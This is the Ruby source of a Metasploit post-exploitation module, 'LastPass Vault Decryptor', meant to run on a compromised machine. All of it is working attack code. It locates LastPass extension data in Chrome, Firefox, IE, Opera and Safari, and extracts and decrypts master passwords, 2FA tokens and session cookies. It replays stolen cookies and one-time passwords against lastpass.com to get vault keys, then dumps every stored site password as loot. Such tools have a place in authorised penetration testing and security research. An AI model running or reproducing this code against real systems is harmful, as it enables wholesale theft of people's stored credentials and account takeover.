##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'sqlite3'
require 'uri'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::OSX::System
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'LastPass Vault Decryptor',
      'Description' => %q{
        This module extracts and decrypts LastPass master login accounts and passwords,
        encryption keys, 2FA tokens and all the vault passwords
      },
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'Alberto Garcia Illera <agarciaillera[at]gmail.com>', # original module and research
          'Martin Vigo <martinvigo[at]gmail.com>', # original module and research
          'Jon Hart <jon_hart[at]rapid7.com>' # module rework and cleanup
        ],
      'Platform'     => %w(linux osx unix win),
      'References'   =>
        [
          [ 'URL', 'http://www.martinvigo.com/even-the-lastpass-will-be-stolen-deal-with-it' ]
        ],
      'SessionTypes' => %w(meterpreter shell)
    ))
  end

  def run
    if session.platform == 'windows' && session.type == "shell" # No Windows shell support
      print_error "Shell sessions on Windows are not supported"
      return
    end

    print_status "Searching for LastPass databases"

    account_map = build_account_map
    if account_map.empty?
      print_status "No databases found"
      return
    end

    print_status "Extracting credentials"
    extract_credentials(account_map)

    print_status "Extracting 2FA tokens"
    extract_2fa_tokens(account_map)

    print_status "Extracting vault and iterations"
    extract_vault_and_iterations(account_map)

    print_status "Extracting encryption keys"
    extract_vault_keys(account_map)

    print_lastpass_data(account_map)
  end

  # Returns a mapping of lastpass accounts
  def build_account_map
    profiles = user_profiles
    account_map = {}

    profiles.each do |user_profile|
      account = user_profile['UserName']
      browser_path_map = {}
      localstorage_path_map = {}
      cookies_path_map = {}

      case session.platform
      when 'windows'
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles",
          'IE' => "#{user_profile['LocalAppData']}Low\\LastPass",
          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
        }
        localstorage_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Local Storage\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
          'Firefox' => "#{user_profile['LocalAppData']}Low\\LastPass",
          'IE' => "#{user_profile['LocalAppData']}Low\\LastPass",
          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Local Storage\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage"
        }
        cookies_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Cookies",
          'Firefox' => "", # It's set programmatically
          'IE' => "#{user_profile['LocalAppData']}\\Microsoft\\Windows\\INetCookies\\Low",
          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Cookies"
        }
      when 'unix', 'linux'
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox",
          'Opera' => "#{user_profile['LocalAppData']}/.config/opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
        }
        localstorage_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
          'Firefox' => "#{user_profile['LocalAppData']}/.lastpass",
          'Opera' => "#{user_profile['LocalAppData']}/.config/opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage"
        }
        cookies_path_map = { # TODO
          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/Cookies",
          'Firefox' => "", # It's set programmatically
          'Opera' => "#{user_profile['LocalAppData']}/.config/opera/Cookies"
        }
      when 'osx'
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['LocalAppData']}/Firefox/Profiles",
          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
          'Safari' => "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
        }
        localstorage_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
          'Firefox' => "#{user_profile['AppData']}/Containers/com.lastpass.LastPass/Data/Library/Application Support/LastPass",
          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
          'Safari' => "#{user_profile['AppData']}/Safari/LocalStorage/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
        }
        cookies_path_map = { # TODO
          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/Cookies",
          'Firefox' => "", # It's set programmatically
          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/Cookies",
          'Safari' => "#{user_profile['AppData']}/Cookies/Cookies.binarycookies"
        }
      else
        print_error "Platform not recognized: #{session.platform}"
      end

      account_map[account] = {}
      browser_path_map.each_pair do |browser, path|
        account_map[account][browser] = {}
        db_paths = find_db_paths(path, browser, account)
        if db_paths && db_paths.size > 0
          account_map[account][browser]['lp_db_path'] = db_paths.first
          account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if file?(localstorage_path_map[browser]) || browser.match(/Firefox|IE/)
          account_map[account][browser]['cookies_db'] = cookies_path_map[browser] if file?(cookies_path_map[browser]) || browser.match(/Firefox|IE/)
          account_map[account][browser]['cookies_db'] = account_map[account][browser]['lp_db_path'].first.gsub("prefs.js", "cookies.sqlite") if (!account_map[account][browser]['lp_db_path'].blank? && browser == 'Firefox')
        else
          account_map[account].delete(browser)
        end
      end
    end

    account_map
  end

  # Returns a list of DB paths found in the victims' machine
  def find_db_paths(path, browser, account)
    paths = []

    vprint_status "Checking #{account}'s #{browser}"
    if browser == "IE" # Special case for IE
      data = read_registry_key_value('HKEY_CURRENT_USER\Software\LastPass', "LoginUsers")
      data = read_registry_key_value('HKEY_CURRENT_USER\Software\AppDataLow\Software\LastPass', "LoginUsers") if data.blank?
      paths |= ['HKEY_CURRENT_USER\Software\AppDataLow\Software\LastPass'] if !data.blank? && path != "Low\\LastPass" # Hacky way to detect if there is access to user's data (attacker has no root access)
    elsif browser == "Firefox" # Special case for Firefox
      paths |= firefox_profile_files(path)
    else
      paths |= file_paths(path)
    end

    vprint_good "Found #{paths.size} #{browser} databases for #{account}"
    paths
  end

  # Returns the relevant information from user profiles
  def user_profiles
    user_profiles = []
    case session.platform
    when /unix|linux/
      user_names = dir("/home")
      user_names.reject! { |u| %w(. ..).include?(u) }
      user_names.each do |user_name|
        user_profiles.push('UserName' => user_name, "LocalAppData" => "/home/#{user_name}")
      end
    when /osx/
      user_names = session.shell_command("ls /Users").split
      user_names.reject! { |u| u == 'Shared' }
      user_names.each do |user_name|
        user_profiles.push(
          'UserName' => user_name,
          "AppData" => "/Users/#{user_name}/Library",
          "LocalAppData" => "/Users/#{user_name}/Library/Application Support"
        )
      end
    when /windows/
      user_profiles |= grab_user_profiles
    else
      print_error "OS not recognized: #{session.platform}"
    end
    user_profiles
  end

  # Extracts the databases paths from the given folder ignoring . and ..
  def file_paths(path)
    found_dbs_paths = []

    files = []
    files = dir(path) if directory?(path)
    files.each do |file_path|
      unless %w(. .. Shared).include?(file_path)
        found_dbs_paths.push([path, file_path].join(system_separator))
      end
    end

    found_dbs_paths
  end

  # Returns the profile files for Firefox
  def firefox_profile_files(path)
    found_dbs_paths = []

    if directory?(path)
      files = dir(path)
      files.reject! { |file| %w(. ..).include?(file) }
      files.each do |file_path|
        found_dbs_paths.push([path, file_path, 'prefs.js'].join(system_separator)) if file_path.match(/.*\.default/)
      end
    end

    [found_dbs_paths]
  end

  # Parses the Firefox preferences file and returns encoded credentials
  def ie_firefox_credentials(prefs_path, localstorage_db_path)
    credentials = []
    data = nil

    if prefs_path.nil? # IE
      data = read_registry_key_value('HKEY_CURRENT_USER\Software\AppDataLow\Software\LastPass', "LoginUsers")
      data = read_registry_key_value('HKEY_CURRENT_USER\Software\LastPass', "LoginUsers") if data.blank?
      return [] if data.blank?

      usernames = data.split("|")
      usernames.each do |username|
        credentials << [username, nil]
      end

      # Extract master passwords
      data = read_registry_key_value('HKEY_CURRENT_USER\Software\AppDataLow\Software\LastPass', "LoginPws")
      data = Rex::Text.encode_base64(data) unless data.blank?
    else # Firefox
      loot_path = loot_file(prefs_path, nil, 'firefox.preferences', "text/javascript", "Firefox preferences file")
      return [] unless loot_path
      File.readlines(loot_path).each do |line|
        if /user_pref\("extensions.lastpass.loginusers", "(?<encoded_users>.*)"\);/ =~ line
          usernames = encoded_users.split("|")
          usernames.each do |username|
            credentials << [username, nil]
          end
          break
        end
      end

      # Extract master passwords
      path = localstorage_db_path + system_separator + "lp.loginpws"
      data = read_remote_file(path) if file?(path) # Read file if it exists
    end

    # Get encrypted master passwords
    data = windows_unprotect(data) if data != nil && data.match(/^AQAAA.+/) # Verify Windows protection
    return credentials if data.blank? # No passwords stored
    creds_per_user = data.split("|")
    creds_per_user.each_with_index do |user_creds, index|
      parts = user_creds.split('=')
      for creds in credentials
        creds[1] = parts[1] if creds[0] == parts[0] # Add the password to the existing username
      end
    end
    credentials
  end

  def decrypt_data(key, encrypted_data)
    return nil if encrypted_data.blank?

    if encrypted_data.include?("|") # Use CBC
      decipher = OpenSSL::Cipher.new("AES-256-CBC")
      decipher.iv = Rex::Text.decode_base64(encrypted_data[1, 24]) # Discard ! and |
      encrypted_data = encrypted_data[26..-1] # Take only the data part
    else # Use ECB
      decipher = OpenSSL::Cipher.new("AES-256-ECB")
    end

    begin
      decipher.decrypt
      decipher.key = key
      decrypted_data = decipher.update(Rex::Text.decode_base64(encrypted_data)) + decipher.final
    rescue OpenSSL::Cipher::CipherError => e
      vprint_error "Data could not be decrypted. #{e.message}"
    end

    decrypted_data
  end

  def extract_credentials(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        account_map[account][browser]['lp_creds'] = {}
        if browser.match(/Firefox|IE/)
          if browser == "Firefox"
            ieffcreds = ie_firefox_credentials(lp_data['lp_db_path'].first, lp_data['localstorage_db'])
          else # IE
            ieffcreds = ie_firefox_credentials(nil, lp_data['localstorage_db'])
          end
          unless ieffcreds.blank?
            ieffcreds.each do |creds|
              if creds[1].blank? # No master password found
                account_map[account][browser]['lp_creds'][URI.unescape(creds[0])] = { 'lp_password' => nil }
              else
                sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(URI.unescape(creds[0]))
                sha256_binary_email = [sha256_hex_email].pack "H*" # Do hex2bin
                creds[1] = decrypt_data(sha256_binary_email, URI.unescape(creds[1]))
                account_map[account][browser]['lp_creds'][URI.unescape(creds[0])] = { 'lp_password' => creds[1] }
              end
            end
          end
        else # Chrome, Safari and Opera
          loot_path = loot_file(lp_data['lp_db_path'], nil, "#{browser.downcase}.lastpass.database", "application/x-sqlite3", "#{account}'s #{browser} LastPass database #{lp_data['lp_db_path']}")
          account_map[account][browser]['lp_db_loot'] = loot_path
          next if loot_path.blank?
          # Parsing/Querying the DB
          db = SQLite3::Database.new(loot_path)
          result = db.execute(
            "SELECT username, password FROM LastPassSavedLogins2 " \
            "WHERE username IS NOT NULL AND username != '' " \
          )

          for row in result
            if row[0]
              sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(row[0])
              sha256_binary_email = [sha256_hex_email].pack "H*" # Do hex2bin
              row[1].blank? ? row[1] = nil : row[1] = decrypt_data(sha256_binary_email, row[1]) # Decrypt master password
              account_map[account][browser]['lp_creds'][row[0]] = { 'lp_password' => row[1] }
            end
          end
        end
      end
    end
  end

  # Extracts the 2FA token from localStorage
  def extract_2fa_tokens(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        if browser.match(/Firefox|IE/)
          path = lp_data['localstorage_db'] + system_separator + "lp.suid"
          data = read_remote_file(path) if file?(path) # Read file if it exists
          data = windows_unprotect(data) if data != nil && data.size > 32 # Verify Windows protection
          loot_path = loot_file(nil, data, "#{browser.downcase}.lastpass.localstorage", "application/x-sqlite3", "#{account}'s #{browser} LastPass localstorage #{lp_data['localstorage_db']}")
          account_map[account][browser]['lp_2fa'] = data
        else # Chrome, Safari and Opera
          loot_path = loot_file(lp_data['localstorage_db'], nil, "#{browser.downcase}.lastpass.localstorage", "application/x-sqlite3", "#{account}'s #{browser} LastPass localstorage #{lp_data['localstorage_db']}")
          unless loot_path.blank?
            db = SQLite3::Database.new(loot_path)
            token = db.execute(
              "SELECT hex(value) FROM ItemTable " \
              "WHERE key = 'lp.uid';"
            ).flatten
          end
          token.blank? ? account_map[account][browser]['lp_2fa'] = nil : account_map[account][browser]['lp_2fa'] = token.pack('H*')
        end
      end
    end
  end

  # Print all extracted LastPass data
  def print_lastpass_data(account_map)
    lastpass_data_table = Rex::Text::Table.new(
      'Header' => "LastPass Accounts",
      'Indent' => 1,
      'Columns' => %w(Account LP_Username LP_Password LP_2FA LP_Key)
    )

    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        lp_data['lp_creds'].each_pair do |username, user_data|
          lastpass_data_table << [account, username, user_data['lp_password'], lp_data['lp_2fa'], user_data['vault_key']]
        end
      end
    end

    unless account_map.empty?
      print_good lastpass_data_table.to_s
      loot_file(nil, lastpass_data_table.to_csv, "lastpass.data", "text/csv", "LastPass Data")
      print_vault_passwords(account_map)
    end
  end

  def extract_vault_and_iterations(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        lp_data['lp_creds'].each_pair do |username, user_data|
          if browser.match(/Firefox|IE/)
            if browser == "Firefox"
              iterations_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_key.itr"
              vault_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.act.sxml"
            else # IE
              iterations_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_key_ie.itr"
              vault_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.sxml"
            end
            iterations = read_remote_file(iterations_path) if file?(iterations_path) # Read file if it exists
            iterations = nil if iterations.blank? # Verify content
            lp_data['lp_creds'][username]['iterations'] = iterations

            # Find encrypted vault
            vault = read_remote_file(vault_path)
            vault = windows_unprotect(vault) if vault != nil && vault.match(/^AQAAA.+/) # Verify Windows protection
            vault = vault.sub(/iterations=.*;/, "") if file?(vault_path) # Remove iterations info
            loot_path = loot_file(nil, vault, "#{browser.downcase}.lastpass.vault", "text/plain", "#{account}'s #{browser} LastPass vault")
            lp_data['lp_creds'][username]['vault_loot'] = loot_path

          else # Chrome, Safari and Opera
            db = SQLite3::Database.new(lp_data['lp_db_loot'])
            result = db.execute(
              "SELECT data FROM LastPassData " \
              "WHERE username_hash = ? AND type = 'accts'", OpenSSL::Digest::SHA256.hexdigest(username)
            )

            if result.size == 1 && !result[0].blank?
              if  /iterations=(?<iterations>.*);(?<vault>.*)/ =~ result[0][0]
                lp_data['lp_creds'][username]['iterations'] = iterations
              else
                lp_data['lp_creds'][username]['iterations'] = 1
              end
              loot_path = loot_file(nil, vault, "#{browser.downcase}.lastpass.vault", "text/plain", "#{account}'s #{browser} LastPass vault")
              lp_data['lp_creds'][username]['vault_loot'] = loot_path
            else
              lp_data['lp_creds'][username]['iterations'] = nil
              lp_data['lp_creds'][username]['vault_loot'] = nil
            end
          end
        end
      end
    end
  end

  def extract_vault_keys(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        browser_checked = false # Track if local stored vault key was already decrypted for this browser (only one session cookie)
        lp_data['lp_creds'].each_pair do |username, user_data|
          if !user_data['lp_password'].blank? && user_data['iterations'] != nil # Derive vault key from credentials
            lp_data['lp_creds'][username]['vault_key'] = derive_vault_key_from_creds(username, lp_data['lp_creds'][username]['lp_password'], user_data['iterations'])
          else # Get vault key decrypting the locally stored one or from the disabled OTP
            unless browser_checked
              decrypt_local_vault_key(account, browser_map)
              browser_checked = true
            end
            if lp_data['lp_creds'][username]['vault_key'].nil? # If no vault key was found yet, try with dOTP
              otpbin = extract_otpbin(browser, username, lp_data)
              otpbin.blank? ? next : otpbin = otpbin[0..31]
              lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key_with_otp(username, otpbin)
            end
          end
        end
      end
    end
  end

  # Decrypt the locally stored vault key
  def decrypt_local_vault_key(account, browser_map)
    data = nil
    session_cookie_value = nil

    browser_map.each_pair do |browser, lp_data|
      if browser == "IE" && directory?(lp_data['cookies_db'])
        cookies_files = dir(lp_data['cookies_db'])
        cookies_files.reject! { |u| %w(. ..).include?(u) }
        cookies_files.each do |cookie_jar_file|
          data = read_remote_file(lp_data['cookies_db'] + system_separator + cookie_jar_file)
          next if data.blank?
          if /.*PHPSESSID.(?<session_cookie_value_match>.*?).lastpass\.com?/m =~ data # Find the session id
            loot_file(lp_data['cookies_db'] + system_separator + cookie_jar_file, nil, "#{browser.downcase}.lastpass.cookies", "text/plain", "#{account}'s #{browser} cookies DB")
            session_cookie_value = session_cookie_value_match
            break
          end
        end
      else
        case browser
        when /Chrome/
          query = "SELECT encrypted_value FROM cookies WHERE host_key = 'lastpass.com' AND name = 'PHPSESSID'"
        when "Opera"
          query = "SELECT encrypted_value FROM cookies WHERE host_key = 'lastpass.com' AND name = 'PHPSESSID'"
        when "Firefox"
          query = "SELECT value FROM moz_cookies WHERE host = 'lastpass.com' AND name = 'PHPSESSID'"
        else
          vprint_error "Browser #{browser} not supported for cookies"
          next
        end
        # Parsing/Querying the DB
        loot_path = loot_file(lp_data['cookies_db'], nil, "#{browser.downcase}.lastpass.cookies", "application/x-sqlite3", "#{account}'s #{browser} cookies DB")
        next if loot_path.blank?
        db = SQLite3::Database.new(loot_path)
        begin
          result = db.execute(query)
        rescue SQLite3::SQLException => e
          vprint_error "No session cookie was found in #{account}'s #{browser} (#{e.message})"
          next
        end
        next if result.blank? # No session cookie found for this browser
        session_cookie_value = result[0][0]
      end
      return if session_cookie_value.blank?

      # Check if cookie value needs to be decrypted
      if Rex::Text.encode_base64(session_cookie_value).match(/^AQAAA.+/) # Windows Data protection API
        session_cookie_value = windows_unprotect(Rex::Text.encode_base64(session_cookie_value))
      elsif session_cookie_value.match(/^v10/) && browser.match(/Chrome|Opera/) # Chrome/Opera encrypted cookie in Linux
        begin
          decipher = OpenSSL::Cipher.new("AES-256-CBC")
          decipher.decrypt
          decipher.key = OpenSSL::Digest::SHA256.hexdigest("peanuts")
          decipher.iv = " " * 16
          session_cookie_value = session_cookie_value[3..-1] # Discard v10
          session_cookie_value = decipher.update(session_cookie_value) + decipher.final
        rescue OpenSSL::Cipher::CipherError => e
          print_error "Cookie could not be decrypted. #{e.message}"
        end
      end

      # Use the cookie to obtain the encryption key to decrypt the vault key
      uri = URI('https://lastpass.com/login_check.php')
      request = Net::HTTP::Post.new(uri)
      request.set_form_data("wxsessid" => URI.unescape(session_cookie_value), "uuid" => browser_map['lp_2fa'])
      request.content_type = 'application/x-www-form-urlencoded; charset=UTF-8'
      response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true) { |http| http.request(request) }

      # Parse response
      next unless response.body.match(/pwdeckey\="([a-z0-9]+)"/) # Session must have expired
      decryption_key = OpenSSL::Digest::SHA256.hexdigest(response.body.match(/pwdeckey\="([a-z0-9]+)"/)[1])
      username = response.body.match(/lpusername="([A-Za-z0-9._%+-@]+)"/)[1]

      # Get the local encrypted vault key
      encrypted_vault_key = extract_local_encrypted_vault_key(browser, username, lp_data)

      # Decrypt the local stored key
      lp_data['lp_creds'][username]['vault_key'] = decrypt_data([decryption_key].pack("H*"), encrypted_vault_key)
    end
  end

  # Returns otp, encrypted_key
  def extract_otpbin(browser, username, lp_data)
    if browser.match(/Firefox|IE/)
      if browser == "Firefox"
        path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_ff.sotp"
      else # IE
        path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + ".sotp"
      end
      otpbin = read_remote_file(path) if file?(path) # Read file if it exists
      otpbin = windows_unprotect(otpbin) if otpbin != nil && otpbin.match(/^AQAAA.+/)
      return otpbin
    else # Chrome, Safari and Opera
      db = SQLite3::Database.new(lp_data['lp_db_loot'])
      result = db.execute(
        "SELECT type, data FROM LastPassData " \
        "WHERE username_hash = ? AND type = 'otp'", OpenSSL::Digest::SHA256.hexdigest(username)
      )
      return (result.blank? || result[0][1].blank?) ? nil : [result[0][1]].pack("H*")
    end
  end

  def derive_vault_key_from_creds(username, password, key_iteration_count)
    if key_iteration_count == 1
      key = Digest::SHA256.hexdigest username + password
    else
      key = pbkdf2(password, username, key_iteration_count.to_i, 32).first
    end
    key
  end

  def decrypt_vault_key_with_otp(username, otpbin)
    vault_key_decryption_key = [lastpass_sha256(username + otpbin)].pack "H*"
    encrypted_vault_key = retrieve_encrypted_vault_key_with_otp(username, otpbin)
    decrypt_data(vault_key_decryption_key, encrypted_vault_key)
  end

  def retrieve_encrypted_vault_key_with_otp username, otpbin
    # Derive login hash from otp
    otp_token = lastpass_sha256(lastpass_sha256(username + otpbin) + otpbin) # OTP login hash

    # Make request to LastPass
    uri = URI('https://lastpass.com/otp.php')
    request = Net::HTTP::Post.new(uri)
    request.set_form_data("login" => 1, "xml" => 1, "hash" => otp_token, "otpemail" => URI.escape(username), "outofbandsupported" => 1, "changepw" => otp_token)
    request.content_type = 'application/x-www-form-urlencoded; charset=UTF-8'
    response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true) { |http| http.request(request) }

    # Parse response
    encrypted_vault_key = nil
    if response.body.match(/randkey\="(.*)"/)
      encrypted_vault_key = response.body.match(/randkey\="(.*)"/)[1]
    end
    encrypted_vault_key
  end

  # LastPass does some preprocessing (UTF8) when doing a SHA256 on special chars (binary)
  def lastpass_sha256(input)
    output = ""

    input = input.gsub("\r\n", "\n")

    input.each_byte do |e|
      if 128 > e
        output += e.chr
      else
        if (127 < e && 2048 > e)
          output += (e >> 6 | 192).chr
          output += (e & 63 | 128).chr
        else
          output += (e >> 12 | 224).chr
          output += (e >> 6 & 63 | 128).chr
        end
      end
    end

    OpenSSL::Digest::SHA256.hexdigest(output)
  end

  def pbkdf2(password, salt, iterations, key_length)
    digest = OpenSSL::Digest::SHA256.new
    OpenSSL::PKCS5.pbkdf2_hmac(password, salt, iterations, key_length, digest).unpack 'H*'
  end

  def windows_unprotect(data)
    data = Rex::Text.decode_base64(data)
    rg = session.railgun
    pid = session.sys.process.getpid
    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
    mem = process.memory.allocate(data.length + 200)
    process.memory.write(mem, data)

    if session.sys.process.each_process.find { |i| i["pid"] == pid } ["arch"] == "x86"
      addr = [mem].pack("V")
      len = [data.length].pack("V")
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
      len, addr = ret["pDataOut"].unpack("V2")
    else
      addr = Rex::Text.pack_int64le(mem)
      len = Rex::Text.pack_int64le(data.length)
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
      pData = ret["pDataOut"].unpack("VVVV")
      len = pData[0] + (pData[1] << 32)
      addr = pData[2] + (pData[3] << 32)
    end

    return "" if len == 0
    process.memory.read(addr, len)
  end

  def print_vault_passwords(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        lp_data['lp_creds'].each_pair do |username, user_data|
          lastpass_vault_data_table = Rex::Text::Table.new(
            'Header' => "Decrypted vault from #{username}",
            'Indent' => 1,
            'Columns' => %w(URL Username Password)
          )
          if user_data['vault_loot'].nil? # Was a vault found?
            print_error "No vault was found for #{username}"
            next
          end
          encoded_vault = File.read(user_data['vault_loot'])
          if encoded_vault[0] == "!" # Vault is double encrypted
            encoded_vault = decrypt_data([user_data['vault_key']].pack("H*"), encoded_vault)
            if encoded_vault.blank?
              print_error "Vault from #{username} could not be decrypted"
              next
            else
              encoded_vault = encoded_vault.sub("LPB64", "")
            end
          end

          # Parse vault
          vault = Rex::Text.decode_base64(encoded_vault)
          vault.scan(/ACCT/) do |result|
            chunk_length = vault[$~.offset(0)[1]..$~.offset(0)[1] + 3].unpack("H*").first.to_i(16) # Get the length in base 10 of the ACCT chunk
            chunk = vault[$~.offset(0)[0]..$~.offset(0)[1] + chunk_length] # Get ACCT chunk
            account_data = parse_vault_account(chunk, user_data['vault_key'])
            lastpass_vault_data_table << account_data if account_data != nil
          end

          unless account_map.empty? # Loot passwords
            if lastpass_vault_data_table.rows.empty?
              print_status('No decrypted vaults.')
            else
              print_good lastpass_vault_data_table.to_s
            end
            loot_file(nil, lastpass_vault_data_table.to_csv, "#{browser.downcase}.lastpass.passwords", "text/csv", "LastPass Vault Passwords from #{username}")
          end
        end
      end
    end
  end

  def parse_vault_account(chunk, vault_key)
    pointer = 22 # Starting position to find data to decrypt
    labels = ["name", "folder", "url", "notes", "undefined", "undefined2", "username", "password"]
    vault_data = []
    for label in labels
      if chunk[pointer..pointer + 3].nil?
        # Out of bound read
        return nil
      end

      length = chunk[pointer..pointer + 3].unpack("H*").first.to_i(16)
      encrypted_data = chunk[pointer + 4..pointer + 4 + length - 1]
      label != "url" ? decrypted_data = decrypt_vault_password(vault_key, encrypted_data) : decrypted_data = [encrypted_data].pack("H*")
      decrypted_data = "" if decrypted_data.nil?
      vault_data << decrypted_data if (label == "url" || label == "username" || label == "password")
      pointer = pointer + 4 + length
    end

    return vault_data[0] == "http://sn" ? nil : vault_data # TODO: Support secure notes
  end

  def decrypt_vault_password(key, encrypted_data)
    return nil if key.blank? || encrypted_data.blank?

    if encrypted_data[0] == "!" # Apply CBC
      decipher = OpenSSL::Cipher.new("AES-256-CBC")
      decipher.iv = encrypted_data[1, 16] # Discard !
      encrypted_data = encrypted_data[17..-1]
    else # Apply ECB
      decipher = OpenSSL::Cipher.new("AES-256-ECB")
    end
    decipher.decrypt
    decipher.key = [key].pack "H*"

    begin
      return decipher.update(encrypted_data) + decipher.final
    rescue OpenSSL::Cipher::CipherError
      vprint_error "Vault password could not be decrypted with key #{key}"
      return nil
    end
  end

  # Reads a remote file and loots it
  def loot_file(path, data, title, type, description)
    data = read_remote_file(path) if data.nil? # If no data is passed, read remote file
    return nil if data.nil?

    loot_path = store_loot(
      title,
      type,
      session,
      data,
      nil,
      description
    )
    loot_path
  end

  # Reads a remote file and returns the data
  def read_remote_file(path)
    data = nil

    begin
      data = read_file(path)
    rescue EOFError
      vprint_error "Error reading file #{path} It could be empty"
    end
    data
  end

  def read_registry_key_value(key, value)
    begin
      root_key, base_key = session.sys.registry.splitkey(key)
      reg_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
      return nil unless reg_key
      reg_value = reg_key.query_value(value)
      return nil unless reg_value
    rescue Rex::Post::Meterpreter::RequestError => e
      vprint_error("#{e.message} (#{key}\\#{value})")
    end
    reg_key.close if reg_key
    return reg_value.blank? ? nil : reg_value.data
  end

  def extract_local_encrypted_vault_key(browser, username, lp_data)
    if browser.match(/Firefox|IE/)
      encrypted_key_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lpall.slps"
      encrypted_vault_key = read_remote_file(encrypted_key_path)
      encrypted_vault_key = windows_unprotect(encrypted_vault_key) if encrypted_vault_key != nil && encrypted_vault_key.match(/^AQAAA.+/) # Verify Windows protection
    else
      db = SQLite3::Database.new(lp_data['lp_db_loot'])
      result = db.execute(
        "SELECT data FROM LastPassData " \
        "WHERE username_hash = ? AND type = 'key'", OpenSSL::Digest::SHA256.hexdigest(username)
      )
      encrypted_vault_key = result[0][0]
    end

    return encrypted_vault_key.blank? ? nil : encrypted_vault_key.split("\n")[0] # Return only the key, not the "lastpass rocks" part
  end

  # Returns OS separator in a session type agnostic way
  def system_separator
    return session.platform == 'windows' ? '\\' : '/'
  end
end
